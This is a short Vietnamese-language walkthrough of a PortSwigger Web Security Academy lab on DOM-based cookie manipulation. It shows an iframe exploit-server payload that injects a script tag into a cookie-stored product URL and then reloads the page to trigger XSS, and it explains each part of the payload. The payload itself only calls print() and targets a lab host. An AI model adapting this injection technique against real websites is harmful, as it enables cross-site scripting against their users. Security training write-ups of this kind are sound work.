## DOM-based cookie manipulation

> Lab này nói rõ rằng cookie bị tào lao nên để solve lab chúng ta cần inject vào cookie 1 đoạn script gây ra xss bằng cách gọi hàm print()

![](/imgs/DOM-BASED-VULNERABILITIES/12.png?raw=true)

Khi vào xem 1 sản phẩm bất kì cookie sẽ lưu lại link của sản phẩm cuối cùng đã xem

![](/imgs/DOM-BASED-VULNERABILITIES/13.png?raw=true)

Vậy exploit server sẽ có đoạn body như sau:

```html
<iframe src="https://accc1fa81efb316280f40d10006d00f3.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!x)this.src='https://accc1fa81efb316280f40d10006d00f3.web-security-academy.net/';x='err';">
```

> ***/product?productId=1&'><script>print()</script>*** sẽ đóng đoạn truyền thêm param lại, và sau đó chuyển qua tới đoạn script.

> ***onload="if(!x)this.src='https://accc1fa81efb316280f40d10006d00f3.web-security-academy.net/';x='err'*** => ta sẽ chỉ ra 1 biến tào lao nào đó không tồn tại để thực hiện execute cái src thôi.

![](/imgs/DOM-BASED-VULNERABILITIES/14.png?raw=true)

### Tài liệu tham khảo
- DOM-based Vuln: [https://portswigger.net/web-security/dom-based](https://portswigger.net/web-security/dom-based)